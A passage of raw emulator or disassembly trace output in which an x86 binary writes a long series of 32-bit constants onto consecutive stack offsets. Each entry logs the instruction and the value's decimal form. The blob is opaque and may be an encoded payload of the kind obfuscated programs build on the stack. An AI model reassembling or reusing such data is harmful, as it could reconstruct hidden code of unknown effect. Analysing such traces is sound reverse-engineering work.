0x10000 saving data to stack: 1150908637 4 0x402823: mov dword ptr [esp + 0x834], 0x7b66b1da, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8834 for stack size 0x10000 saving data to stack: 2070327770 4 0x40282e: mov dword ptr [esp + 0x838], 0xd72d700a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8838 for stack size 0x10000 saving data to stack: 3610079242 4 0x402839: mov dword ptr [esp + 0x83c], 0xd58e5b97, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x883c for stack size 0x10000 saving data to stack: 3582876567 4 0x402844: mov dword ptr [esp + 0x840], 0xe2da741f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8840 for stack size 0x10000 saving data to stack: 3805967391 4 0x40284f: mov dword ptr [esp + 0x844], 0xe599a260, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8844 for stack size 0x10000 saving data to stack: 3852051040 4 0x40285a: mov dword ptr [esp + 0x848], 0x8a36f8bc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8848 for stack size 0x10000 saving data to stack: 2318858428 4 0x402865: mov dword ptr [esp + 0x84c], 0xf1b0aded, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x884c for stack size 0x10000 saving data to stack: 4054887917 4 0x402870: mov dword ptr [esp + 0x850], 0x3c37b291, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8850 for stack size 0x10000 saving data to stack: 1010283153 4 0x40287b: mov dword ptr [esp + 0x854], 0xd9eca996, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8854 for stack size 0x10000 saving data to stack: 3656165782 4 0x402886: mov dword ptr [esp + 0x858], 0x9c98974e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8858 for stack size 0x10000 saving data to stack: 2627245902 4 0x402891: mov dword ptr [esp + 0x85c], 0x4e7c8f93, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x885c for stack size 0x10000 saving data to stack: 1316786067 4 0x40289c: mov dword ptr [esp + 0x860], 0x30e5ec3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8860 for stack size 0x10000 saving data to stack: 51273411 4 0x4028a7: mov dword ptr [esp + 0x864], 0xb303651c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8864 for stack size 0x10000 saving data to stack: 3003344156 4 0x4028b2: mov dword ptr [esp + 0x868], 0xb4e19cd0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8868 for stack size 0x10000 saving data to stack: 3034684624 4 0x4028bd: mov dword ptr [esp + 0x86c], 0x1d0afbd9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x886c for stack size 0x10000 saving data to stack: 487259097 4 0x4028c8: mov dword ptr [esp + 0x870], 0x685d98a5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8870 for stack size 0x10000 saving data to stack: 1750964389 4 0x4028d3: mov dword ptr [esp + 0x874], 0x15702ab2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8874 for stack size 0x10000 saving data to stack: 359672498 4 0x4028de: mov dword ptr [esp + 0x878], 0xbea58292, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8878 for stack size 0x10000 saving data to stack: 3198517906 4 0x4028e9: mov dword ptr [esp + 0x87c], 0xec9f0b2f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x887c for stack size 0x10000 saving data to stack: 3969846063 4 0x4028f4: mov dword ptr [esp + 0x880], 0xd9e7edc7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8880 for stack size 0x10000 saving data to stack: 3655855559 4 0x4028ff: mov dword ptr [esp + 0x884], 0xee382718, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8884 for stack size 0x10000 saving data to stack: 3996657432 4 0x40290a: mov dword ptr [esp + 0x888], 0xfb547f64, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8888 for stack size 0x10000 saving data to stack: 4216618852 4 0x402915: mov dword ptr [esp + 0x88c], 0xded281c5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x888c for stack size 0x10000 saving data to stack: 3738337733 4 0x402920: mov dword ptr [esp + 0x890], 0x8915da19, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8890 for stack size 0x10000 saving data to stack: 2299910681 4 0x40292b: mov dword ptr [esp + 0x894], 0x550f35ce, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8894 for stack size 0x10000 saving data to stack: 1427060174 4 0x402936: mov dword ptr [esp + 0x898], 0x3a1c1ff6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8898 for stack size 0x10000 saving data to stack: 974921718 4 0x402941: mov dword ptr [esp + 0x89c], 0x1e3b012b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x889c for stack size 0x10000 saving data to stack: 507183403 4 0x40294c: mov dword ptr [esp + 0x8a0], 0x6bcb536b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88a0 for stack size 0x10000 saving data to stack: 1808487275 4 0x402957: mov dword ptr [esp + 0x8a4], 0xa90c91d4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88a4 for stack size 0x10000 saving data to stack: 2836173268 4 0x402962: mov dword ptr [esp + 0x8a8], 0xf6569f18, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88a8 for stack size 0x10000 saving data to stack: 4132871960 4 0x40296d: mov dword ptr [esp + 0x8ac], 0xf9637311, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88ac for stack size 0x10000 saving data to stack: 4184044305 4 0x402978: mov dword ptr [esp + 0x8b0], 0x4277b86d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88b0 for stack size 0x10000 saving data to stack: 1115142253 4 0x402983: mov dword ptr [esp + 0x8b4], 0xd213ca8a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88b4 for stack size 0x10000 saving data to stack: 3524512394 4 0x40298e: mov dword ptr [esp + 0x8b8], 0xdb643c1a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88b8 for stack size 0x10000 saving data to stack: 3680779290 4 0x402999: mov dword ptr [esp + 0x8bc], 0xea0239c7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88bc for stack size 0x10000 saving data to stack: 3926014407 4 0x4029a4: mov dword ptr [esp + 0x8c0], 0xc067fbaf, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88c0 for stack size 0x10000 saving data to stack: 3228040111 4 0x4029af: mov dword ptr [esp + 0x8c4], 0x990afc90, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88c4 for stack size 0x10000 saving data to stack: 2567634064 4 0x4029ba: mov dword ptr [esp + 0x8c8], 0xa3c7a24c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88c8 for stack size 0x10000 saving data to stack: 2747769420 4 0x4029c5: mov dword ptr [esp + 0x8cc], 0x485dc69d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88cc for stack size 0x10000 saving data to stack: 1214105245 4 0x4029d0: mov dword ptr [esp + 0x8d0], 0xa1e6d121, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88d0 for stack size 0x10000 saving data to stack: 2716258593 4 0x4029db: mov dword ptr [esp + 0x8d4], 0xee6087c6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88d4 for stack size 0x10000 saving data to stack: 3999303622 4 0x4029e6: mov dword ptr [esp + 0x8d8], 0x5c56ff5e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88d8 for stack size 0x10000 saving data to stack: 1549205342 4 0x4029f1: mov dword ptr [esp + 0x8dc], 0x5965c0c3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88dc for stack size 0x10000 saving data to stack: 1499840707 4 0x4029fc: mov dword ptr [esp + 0x8e0], 0xbe1447d3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88e0 for stack size 0x10000 saving data to stack: 3189000147 4 0x402a07: mov dword ptr [esp + 0x8e4], 0x5c7443cc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88e4 for stack size 0x10000 saving data to stack: 1551123404 4 0x402a12: mov dword ptr [esp + 0x8e8], 0x1f656060, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88e8 for stack size 0x10000 saving data to stack: 526737504 4 0x402a1d: mov dword ptr [esp + 0x8ec], 0x92b4c509, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88ec for stack size 0x10000 saving data to stack: 2461320457 4 0x402a28: mov dword ptr [esp + 0x8f0], 0x7ad5e8b5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88f0 for stack size 0x10000 saving data to stack: 2060839093 4 0x402a33: mov dword ptr [esp + 0x8f4], 0xc4b4b962, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88f4 for stack size 0x10000 saving data to stack: 3300178274 4 0x402a3e: mov dword ptr [esp + 0x8f8], 0xfe314f22, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88f8 for stack size 0x10000 saving data to stack: 4264644386 4 0x402a49: mov dword ptr [esp + 0x8fc], 0xf7883c5f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x88fc for stack size 0x10000 saving data to stack: 4152900703 4 0x402a54: mov dword ptr [esp + 0x900], 0x2ab8ec57, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8900 for stack size 0x10000 saving data to stack: 716762199 4 0x402a5f: mov dword ptr [esp + 0x904], 0xe36ced48, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8904 for stack size 0x10000 saving data to stack: 3815566664 4 0x402a6a: mov dword ptr [esp + 0x908], 0xf7316b74, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8908 for stack size 0x10000 saving data to stack: 4147211124 4 0x402a75: mov dword ptr [esp + 0x90c], 0xa38913f5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x890c for stack size 0x10000 saving data to stack: 2743669749 4 0x402a80: mov dword ptr [esp + 0x910], 0x2d5db729, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8910 for stack size 0x10000 saving data to stack: 761116457 4 0x402a8b: mov dword ptr [esp + 0x914], 0x38c2787e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8914 for stack size 0x10000 saving data to stack: 952268926 4 0x402a96: mov dword ptr [esp + 0x918], 0x6a4cd986, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8918 for stack size 0x10000 saving data to stack: 1783421318 4 0x402aa1: mov dword ptr [esp + 0x91c], 0x7076705b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x891c for stack size 0x10000 saving data to stack: 1886810203 4 0x402aac: mov dword ptr [esp + 0x920], 0xe2203e7b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8920 for stack size 0x10000 saving data to stack: 3793763963 4 0x402ab7: mov dword ptr [esp + 0x924], 0xffb9aa84, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8924 for stack size 0x10000 saving data to stack: 4290357892 4 0x402ac2: mov dword ptr [esp + 0x928], 0x1c552a8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8928 for stack size 0x10000 saving data to stack: 29708968 4 0x402acd: mov dword ptr [esp + 0x92c], 0xbe1a0541, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x892c for stack size 0x10000 saving data to stack: 3189376321 4 0x402ad8: mov dword ptr [esp + 0x930], 0xf847a4fd, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8930 for stack size 0x10000 saving data to stack: 4165444861 4 0x402ae3: mov dword ptr [esp + 0x934], 0x28c0e33a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8934 for stack size 0x10000 saving data to stack: 683729722 4 0x402aee: mov dword ptr [esp + 0x938], 0xe6cc44aa, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8938 for stack size 0x10000 saving data to stack: 3872146602 4 0x402af9: mov dword ptr [esp + 0x93c], 0x3bfb4177, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x893c for stack size 0x10000 saving data to stack: 1006322039 4 0x402b04: mov dword ptr [esp + 0x940], 0xb37460bf, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8940 for stack size 0x10000 saving data to stack: 3010748607 4 0x402b0f: mov dword ptr [esp + 0x944], 0x7cbe3f40, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8944 for stack size 0x10000 saving data to stack: 2092842816 4 0x402b1a: mov dword ptr [esp + 0x948], 0x3be029dc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8948 for stack size 0x10000 saving data to stack: 1004546524 4 0x402b25: mov dword ptr [esp + 0x94c], 0x2820894d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x894c for stack size 0x10000 saving data to stack: 673220941 4 0x402b30: mov dword ptr [esp + 0x950], 0x666e1e31, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8950 for stack size 0x10000 saving data to stack: 1718492721 4 0x402b3b: mov dword ptr [esp + 0x954], 0xe3954df6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8954 for stack size 0x10000 saving data to stack: 3818212854 4 0x402b46: mov dword ptr [esp + 0x958], 0x8096b4ee, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8958 for stack size 0x10000 saving data to stack: 2157360366 4 0x402b51: mov dword ptr [esp + 0x95c], 0x196841f3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x895c for stack size 0x10000 saving data to stack: 426263027 4 0x402b5c: mov dword ptr [esp + 0x960], 0x809aaf63, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8960 for stack size 0x10000 saving data to stack: 2157621091 4 0x402b67: mov dword ptr [esp + 0x964], 0x976ef27c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8964 for stack size 0x10000 saving data to stack: 2540630652 4 0x402b72: mov dword ptr [esp + 0x968], 0x1022f770, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8968 for stack size 0x10000 saving data to stack: 270727024 4 0x402b7d: mov dword ptr [esp + 0x96c], 0x25274ab9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x896c for stack size 0x10000 saving data to stack: 623332025 4 0x402b88: mov dword ptr [esp + 0x970], 0xd4147445, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8970 for stack size 0x10000 saving data to stack: 3558110277 4 0x402b93: mov dword ptr [esp + 0x974], 0x3a5e8292, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8974 for stack size 0x10000 saving data to stack: 979272338 4 0x402b9e: mov dword ptr [esp + 0x978], 0x6ce1de32, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8978 for stack size 0x10000 saving data to stack: 1826741810 4 0x402ba9: mov dword ptr [esp + 0x97c], 0x6d32058f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x897c for stack size 0x10000 saving data to stack: 1831994767 4 0x402bb4: mov dword ptr [esp + 0x980], 0x41a382e7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8980 for stack size 0x10000 saving data to stack: 1101234919 4 0x402bbf: mov dword ptr [esp + 0x984], 0xf7e0cb78, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8984 for stack size 0x10000 saving data to stack: 4158704504 4 0x402bca: mov dword ptr [esp + 0x988], 0x88fb0b84, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8988 for stack size 0x10000 saving data to stack: 2298153860 4 0x402bd5: mov dword ptr [esp + 0x98c], 0x56fa6e25, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x898c for stack size 0x10000 saving data to stack: 1459252773 4 0x402be0: mov dword ptr [esp + 0x990], 0x3611ad39, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8990 for stack size 0x10000 saving data to stack: 907128121 4 0x402beb: mov dword ptr [esp + 0x994], 0xec33d2ae, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8994 for stack size 0x10000 saving data to stack: 3962819246 4 0x402bf6: mov dword ptr [esp + 0x998], 0xaa645396, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8998 for stack size 0x10000 saving data to stack: 2858701718 4 0x402c01: mov dword ptr [esp + 0x99c], 0xc723890b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x899c for stack size 0x10000 saving data to stack: 3340994827 4 0x402c0c: mov dword ptr [esp + 0x9a0], 0xc724710b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89a0 for stack size 0x10000 saving data to stack: 3341054219 4 0x402c17: mov dword ptr [esp + 0x9a4], 0x5666c334, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89a4 for stack size 0x10000 saving data to stack: 1449575220 4 0x402c22: mov dword ptr [esp + 0x9a8], 0xf3747fb8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89a8 for stack size 0x10000 saving data to stack: 4084498360 4 0x402c2d: mov dword ptr [esp + 0x9ac], 0x5a1737f1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89ac for stack size 0x10000 saving data to stack: 1511471089 4 0x402c38: mov dword ptr [esp + 0x9b0], 0x75ab5d8d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89b0 for stack size 0x10000 saving data to stack: 1974164877 4 0x402c43: mov dword ptr [esp + 0x9b4], 0x844497ea, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89b4 for stack size 0x10000 saving data to stack: 2219087850 4 0x402c4e: mov dword ptr [esp + 0x9b8], 0x1a80023a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89b8 for stack size 0x10000 saving data to stack: 444596794 4 0x402c59: mov dword ptr [esp + 0x9bc], 0x883b2827, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89bc for stack size 0x10000 saving data to stack: 2285578279 4 0x402c64: mov dword ptr [esp + 0x9c0], 0x8edde0cf, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89c0 for stack size 0x10000 saving data to stack: 2396905679 4 0x402c6f: mov dword ptr [esp + 0x9c4], 0x72356cf0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89c4 for stack size 0x10000 saving data to stack: 1916103920 4 0x402c7a: mov dword ptr [esp + 0x9c8], 0x1cdfe6ec, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89c8 for stack size 0x10000 saving data to stack: 484435692 4 0x402c85: mov dword ptr [esp + 0x9cc], 0x499b5cfd, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89cc for stack size 0x10000 saving data to stack: 1234918653 4 0x402c90: mov dword ptr [esp + 0x9d0], 0xc48e9541, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89d0 for stack size 0x10000 saving data to stack: 3297678657 4 0x402c9b: mov dword ptr [esp + 0x9d4], 0xc1cbbb26, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89d4 for stack size 0x10000 saving data to stack: 3251354406 4 0x402ca6: mov dword ptr [esp + 0x9d8], 0xc75f01fe, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89d8 for stack size 0x10000 saving data to stack: 3344892414 4 0x402cb1: mov dword ptr [esp + 0x9dc], 0x79a007a3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89dc for stack size 0x10000 saving data to stack: 2040530851 4 0x402cbc: mov dword ptr [esp + 0x9e0], 0x3e580773, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89e0 for stack size 0x10000 saving data to stack: 1045956467 4 0x402cc7: mov dword ptr [esp + 0x9e4], 0xd18bbac, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89e4 for stack size 0x10000 saving data to stack: 219724716 4 0x402cd2: mov dword ptr [esp + 0x9e8], 0x5c353000, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89e8 for stack size 0x10000 saving data to stack: 1546989568 4 0x402cdd: mov dword ptr [esp + 0x9ec], 0x4ea0d69, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89ec for stack size 0x10000 saving data to stack: 82447721 4 0x402ce8: mov dword ptr [esp + 0x9f0], 0xb0ae4855, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89f0 for stack size 0x10000 saving data to stack: 2964211797 4 0x402cf3: mov dword ptr [esp + 0x9f4], 0x75593142, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89f4 for stack size 0x10000 saving data to stack: 1968779586 4 0x402cfe: mov dword ptr [esp + 0x9f8], 0x2a2559c2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89f8 for stack size 0x10000 saving data to stack: 707090882 4 0x402d09: mov dword ptr [esp + 0x9fc], 0x2342a4bf, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x89fc for stack size 0x10000 saving data to stack: 591570111 4 0x402d14: mov dword ptr [esp + 0xa00], 0xf09279f7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a00 for stack size 0x10000 saving data to stack: 4036131319 4 0x402d1f: mov dword ptr [esp + 0xa04], 0x6a7d4a8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a04 for stack size 0x10000 saving data to stack: 111662248 4 0x402d2a: mov dword ptr [esp + 0xa08], 0xf175b594, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a08 for stack size 0x10000 saving data to stack: 4051023252 4 0x402d35: mov dword ptr [esp + 0xa0c], 0x24096655, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a0c for stack size 0x10000 saving data to stack: 604595797 4 0x402d40: mov dword ptr [esp + 0xa10], 0x2c14b249, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a10 for stack size 0x10000 saving data to stack: 739553865 4 0x402d4b: mov dword ptr [esp + 0xa14], 0x563e22de, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a14 for stack size 0x10000 saving data to stack: 1446912734 4 0x402d56: mov dword ptr [esp + 0xa18], 0xdd0411a6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a18 for stack size 0x10000 saving data to stack: 3708031398 4 0x402d61: mov dword ptr [esp + 0xa1c], 0x36aaaebb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a1c for stack size 0x10000 saving data to stack: 917155515 4 0x402d6c: mov dword ptr [esp + 0xa20], 0xddf7649b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a20 for stack size 0x10000 saving data to stack: 3723977883 4 0x402d77: mov dword ptr [esp + 0xa24], 0x442ef7e4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a24 for stack size 0x10000 saving data to stack: 1143928804 4 0x402d82: mov dword ptr [esp + 0xa28], 0x4515b6c8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a28 for stack size 0x10000 saving data to stack: 1159050952 4 0x402d8d: mov dword ptr [esp + 0xa2c], 0xfad4c7a1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a2c for stack size 0x10000 saving data to stack: 4208248737 4 0x402d98: mov dword ptr [esp + 0xa30], 0x368a71d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a30 for stack size 0x10000 saving data to stack: 57190173 4 0x402da3: mov dword ptr [esp + 0xa34], 0x720ccc9a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a34 for stack size 0x10000 saving data to stack: 1913441434 4 0x402dae: mov dword ptr [esp + 0xa38], 0x95fc9e4a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a38 for stack size 0x10000 saving data to stack: 2516360778 4 0x402db9: mov dword ptr [esp + 0xa3c], 0xcc347657, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a3c for stack size 0x10000 saving data to stack: 3425990231 4 0x402dc4: mov dword ptr [esp + 0xa40], 0xa1a9a25f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a40 for stack size 0x10000 saving data to stack: 2712248927 4 0x402dcf: mov dword ptr [esp + 0xa44], 0xdc3fbd20, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a44 for stack size 0x10000 saving data to stack: 3695164704 4 0x402dda: mov dword ptr [esp + 0xa48], 0x490626fc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a48 for stack size 0x10000 saving data to stack: 1225139964 4 0x402de5: mov dword ptr [esp + 0xa4c], 0xe856c8ad, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a4c for stack size 0x10000 saving data to stack: 3898001581 4 0x402df0: mov dword ptr [esp + 0xa50], 0xfb06e0d1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a50 for stack size 0x10000 saving data to stack: 4211531985 4 0x402dfb: mov dword ptr [esp + 0xa54], 0xd092c456, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a54 for stack size 0x10000 saving data to stack: 3499279446 4 0x402e06: mov dword ptr [esp + 0xa58], 0x5b67c58e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a58 for stack size 0x10000 saving data to stack: 1533527438 4 0x402e11: mov dword ptr [esp + 0xa5c], 0x4522aa53, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a5c for stack size 0x10000 saving data to stack: 1159899731 4 0x402e1c: mov dword ptr [esp + 0xa60], 0xc1dd8d03, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a60 for stack size 0x10000 saving data to stack: 3252522243 4 0x402e27: mov dword ptr [esp + 0xa64], 0xa9a97fdc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a64 for stack size 0x10000 saving data to stack: 2846457820 4 0x402e32: mov dword ptr [esp + 0xa68], 0x73b0cb10, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a68 for stack size 0x10000 saving data to stack: 1940966160 4 0x402e3d: mov dword ptr [esp + 0xa6c], 0x13b11699, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a6c for stack size 0x10000 saving data to stack: 330372761 4 0x402e48: mov dword ptr [esp + 0xa70], 0x272cc6e5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a70 for stack size 0x10000 saving data to stack: 657245925 4 0x402e53: mov dword ptr [esp + 0xa74], 0xc164572, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a74 for stack size 0x10000 saving data to stack: 202786162 4 0x402e5e: mov dword ptr [esp + 0xa78], 0x7d74b0d2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a78 for stack size 0x10000 saving data to stack: 2104799442 4 0x402e69: mov dword ptr [esp + 0xa7c], 0xe34525ef, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a7c for stack size 0x10000 saving data to stack: 3812959727 4 0x402e74: mov dword ptr [esp + 0xa80], 0x98b71c07, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a80 for stack size 0x10000 saving data to stack: 2562137095 4 0x402e7f: mov dword ptr [esp + 0xa84], 0xe4de41d8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a84 for stack size 0x10000 saving data to stack: 3839771096 4 0x402e8a: mov dword ptr [esp + 0xa88], 0xba23ada4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a88 for stack size 0x10000 saving data to stack: 3122900388 4 0x402e95: mov dword ptr [esp + 0xa8c], 0xd5789c85, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a8c for stack size 0x10000 saving data to stack: 3581451397 4 0x402ea0: mov dword ptr [esp + 0xa90], 0x47e50859, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a90 for stack size 0x10000 saving data to stack: 1206192217 4 0x402eab: mov dword ptr [esp + 0xa94], 0x4bb5508e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a94 for stack size 0x10000 saving data to stack: 1270173838 4 0x402eb6: mov dword ptr [esp + 0xa98], 0xf8eb4e36, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a98 for stack size 0x10000 saving data to stack: 4176170550 4 0x402ec1: mov dword ptr [esp + 0xa9c], 0x14e11beb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8a9c for stack size 0x10000 saving data to stack: 350297067 4 0x402ecc: mov dword ptr [esp + 0xaa0], 0x2a9a81ab, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8aa0 for stack size 0x10000 saving data to stack: 714768811 4 